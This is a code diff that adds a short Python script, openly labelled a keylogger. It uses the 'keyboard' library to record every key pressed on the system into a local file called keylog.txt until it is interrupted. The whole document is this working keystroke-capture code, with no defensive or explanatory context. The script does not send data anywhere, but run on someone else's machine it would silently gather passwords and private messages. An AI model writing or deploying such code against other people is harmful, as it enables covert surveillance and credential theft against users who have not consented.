@@ -1,0 +1,19 @@
+import keyboard # type: ignore
+import time
+
+# Create a file to log keystrokes
+log_file = "keylog.txt"
+
+def log_key(key):
+    # Log the key press
+    with open(log_file, "a") as f:
+        f.write(f"{key} ")
+
+print("Keylogger started. Press Ctrl+C to stop.")
+try:
+    while True:
+        key = keyboard.read_key()
+        log_key(key)
+        time.sleep(0.01)  # Add a small delay to avoid high CPU usage
+except KeyboardInterrupt:
+    print("Keylogger stopped.")
